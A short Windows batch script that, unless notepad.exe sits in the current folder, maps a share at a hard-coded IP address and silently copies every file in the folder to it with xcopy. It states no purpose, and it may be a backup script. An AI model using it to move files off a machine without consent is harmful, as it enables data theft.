@echo off

if NOT EXIST notepad.exe goto ok

cls
echo Insert Message
echo Broken!
pause
exit:

:ok

net use j: \\193.60.172.43\user

xcopy /e/y/d * j:\

net use j: /delete